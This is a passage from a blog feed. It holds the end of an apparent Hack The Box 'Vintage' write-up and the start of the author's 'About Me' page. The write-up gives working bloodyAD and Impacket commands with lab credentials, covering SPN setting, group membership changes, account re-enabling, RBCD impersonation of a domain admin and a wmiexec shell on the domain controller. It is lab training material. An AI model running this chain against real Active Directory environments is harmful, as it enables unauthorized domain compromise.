+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>The user C.Neri_adm is a member of DelegatedAdmins, Remote Desktop Users. Note here that, by default:&lt;/p>
+&lt;p>The &lt;strong>Remote Desktop Users&lt;/strong> group does &lt;strong>not&lt;/strong> inherently grant WinRM access.&lt;br>
+Which means we cant use &lt;strong>Evil-Winrm&lt;/strong> as &lt;strong>C.Neri_adm.&lt;/strong> If it would Be &lt;strong>Remote Login User&lt;/strong> than only it was possible but its &lt;strong>Remote Desktop User&lt;/strong> which means he can have &lt;strong>RDP&lt;/strong> but in this box RDP port is disabled so we cant use that which leads us to check &lt;strong>C.Neri_adm via bloodhound&lt;/strong>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-62.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="28-cneri_adm-bloodhound-">28. &lt;strong>C.NERI_ADM BLOODHOUND&lt;/strong> :&lt;/h2>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-63.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-64.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-65.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-66.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Since C.Neri_adm is not the service account so although he is a part of Delegatedadmins but in order to Abuse RBCD. We must have a SPN (ServicePrincipalName) otherwise KDC will report an error.&lt;/p>
+&lt;h3 id="situation">Situation:&lt;/h3>
+&lt;p>&lt;strong>Users with delegate flag do not have SPN, and users who can add SPN are not among delegatedadmins.&lt;/strong>&lt;/p>
+&lt;h3 id="solution">Solution:&lt;/h3>
+&lt;p>We can use &lt;strong>C.Neri_adm to add SPN&lt;/strong> to the serviceaccount, and then we can use this &lt;strong>serviceaccount&lt;/strong> to implement &lt;strong>RBCD ABUSE&lt;/strong> (this serviceaccount should be &lt;strong>svc_sql&lt;/strong>, because we only know its &lt;strong>password&lt;/strong>&lt;/p>
+&lt;h2 id="29-setting-spn-for-the-svc_sql-">29. &lt;strong>SETTING SPN FOR THE SVC_SQL&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri_adm -p &lt;span class="s1">&amp;#39;Uncr4ck4bl3P4ssW0rd0312&amp;#39;&lt;/span> -k &lt;span class="nb">set&lt;/span> object &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span> servicePrincipalName  -v &lt;span class="s2">&amp;#34;cifs/fake&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-67.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-68.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We get an error of insufficient access rights. Means as a C.Neri_adm we cant set SPN for SVC_SQL.&lt;/p>
+&lt;p>Earlier as a C.Neri, we saw this:&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-69.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>ServiceManagers have GenericAll over SVC_SQL. Since C.Neri is a member of ServiceManagers so he might have that same privilege which will allow us to set SPN for SVC_SQL&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri -p &lt;span class="s1">&amp;#39;Zer0the0ne&amp;#39;&lt;/span> -k &lt;span class="nb">set&lt;/span> object &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span> servicePrincipalName  -v &lt;span class="s2">&amp;#34;cifs/dc02.htb&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-70.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="30-adding-svc_sql-to-the-delegatedadmins-group-via-cneri_adm-">30. &lt;strong>ADDING SVC_SQL TO THE DELEGATEDADMINS GROUP VIA C.NERI_ADM&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri_adm -p &lt;span class="s1">&amp;#39;Uncr4ck4bl3P4ssW0rd0312&amp;#39;&lt;/span> -k add groupMember &lt;span class="s2">&amp;#34;DELEGATEDADMINS&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;SVC_SQL&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-71.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="31-enabling-the-svc_sql-accountsince-it-was-disabled-when-checked-via-bloodhound-">31. &lt;strong>ENABLING THE SVC_SQL ACCOUNT(since it was disabled when checked via bloodhound)&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> -u c.neri -p &lt;span class="s1">&amp;#39;Zer0the0ne&amp;#39;&lt;/span> -k remove uac SVC_SQL -f ACCOUNTDISABLE
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-72.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="32-obtaining-svc_sql-tgt-">32. &lt;strong>OBTAINING SVC_SQL TGT&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'svc_sql.ccache'&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-73.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="33-rbcd-attack-with-sql_svc-tgt-">33. &lt;strong>RBCD ATTACK WITH SQL_SVC TGT&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getST -spn &lt;span class="s1">&amp;#39;cifs/dc01.vintage.htb&amp;#39;&lt;/span> -impersonate administrator -dc-ip 10.10.11.45 -k -no-pass &lt;span class="s1">&amp;#39;vintage.htb/svc_sql:Zer0the0ne&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-74.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We can use administrator cifs for an smb access but we cant use beyond that like wmiexec or any else semi interactive shell because the administrator is prohibited from accessing cifs. The same is true for DC01, but &lt;strong>L.Bianchi_adm&lt;/strong> can.&lt;/p>
+&lt;p>So we need to impersonate as &lt;strong>L.Bianchi_adm&lt;/strong>.&lt;/p>
+&lt;p>Why &lt;strong>L.Bianchi_adm&lt;/strong> ?&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-75.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-76.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>That’s why!&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getST -spn &lt;span class="s1">&amp;#39;cifs/dc01.vintage.htb&amp;#39;&lt;/span> -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k -no-pass &lt;span class="s1">&amp;#39;vintage.htb/svc_sql:Zer0the0ne&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">export&lt;/span> &lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$PWD&lt;/span>/&lt;span class="s1">&amp;#39;L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-77.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-78.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="34-access-via-wmiexec-">34. &lt;strong>ACCESS VIA WMIEXEC&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-79.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-80.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="alhamdulillah">ALHAMDULILLAH&lt;/h3>
+&lt;h5 id="rooted">#ROOTED&lt;/h5></description></item><item><title>About Me</title><link>http://localhost:1313/about/</link><pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/about/</guid><description>&lt;p>I&amp;rsquo;m a Penetration Tester with over two years of hands-on experience in offensive security. I specialize in proactively identifying and mitigating vulnerabilities before they can be exploited by threat actors.&lt;/p>
 &lt;p>With a background in Computer Engineering and certifications including &lt;strong>OSCP+&lt;/strong> and &lt;strong>OSCP&lt;/strong>, I’ve spent hundreds of hours in OffSec Proving Grounds and regularly engage in realistic attack simulations on &lt;a href="https://www.hackthebox.com/" target="_blank" rel="noopener">Hack The Box&lt;/a>, where I rank among the top performers. My work is driven by a passion for continuous learning, offensive research, and real-world threat emulation.&lt;/p>
 &lt;hr>
 &lt;h3 id="-core-skill-set">🔐 Core Skill Set&lt;/h3>
